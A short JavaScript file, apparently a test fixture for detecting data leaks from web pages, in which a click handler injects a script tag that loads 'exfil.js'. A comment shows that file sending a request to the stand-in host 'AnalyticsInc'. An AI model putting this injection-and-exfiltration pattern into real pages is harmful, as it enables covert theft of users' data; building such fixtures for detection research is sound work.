function exfiltrate_key_history() {

    // Remote Source 3 - Data Source 1 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL = './exfil.js';
	var tags = document.getElementsByTagName("div");
	tags[0].setAttribute('data-src', URL);
    var script = document.createElement("script");
    script.setAttribute('src', tags[0].getAttribute("data-src"));
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

/*
exfil.js contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote", true);
xmlhttp.send(null);

*/
